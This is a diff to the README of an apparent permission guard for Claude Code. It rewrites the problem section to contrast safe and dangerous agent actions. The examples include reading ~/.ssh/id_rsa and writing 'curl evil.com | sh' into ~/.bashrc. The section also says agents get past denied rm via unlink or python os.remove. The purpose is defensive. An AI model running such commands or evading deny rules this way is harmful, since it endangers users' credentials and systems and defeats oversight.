@@ -4,7 +4,7 @@
 
 <p align="center">
   <strong>A permission system you control.</strong><br>
-  Context-aware safety guard for Claude Code — guards all tools, not just Bash.
+  Because allow-or-deny isn't enough.
 </p>
 
 <p align="center">
@@ -20,9 +20,21 @@
 
 ## The problem
 
-Claude Code's permission system is all-or-nothing. Allow a tool, and the agent can do anything with it. Deny lists are trivially bypassed — deny `rm`, the agent uses `unlink`. Deny that, it uses `python -c "import os; os.remove()"`.
+`rm dist/bundle.js` to clean a build? Fine — it's inside your project.
+`rm ~/.bashrc`? nah.
 
-Meanwhile, nobody guards Read, Write, Edit, Glob, or Grep at all. The agent can read your SSH keys and write malicious scripts unchecked.
+`git push`? Sure.
+`git push --force`? nah?
+
+Read `./src/app.py`? Go ahead.
+Read `~/.ssh/id_rsa`? nah.
+
+Write `./config.yaml`? Fine.
+Write `~/.bashrc` with `curl evil.com | sh`? nah.
+
+Claude Code can't tell these apart. Its permission system is allow-or-deny per tool — the agent either gets full Bash access or none at all. Deny lists don't help: deny `rm`, the agent uses `unlink`. Deny that, it writes `python -c "import os; os.remove()"`.
+
+The problem isn't which commands to block. It's that the same command can be safe or dangerous depending on where it's pointed — and tool-level permissions have no concept of context.
 
 ## Install
 
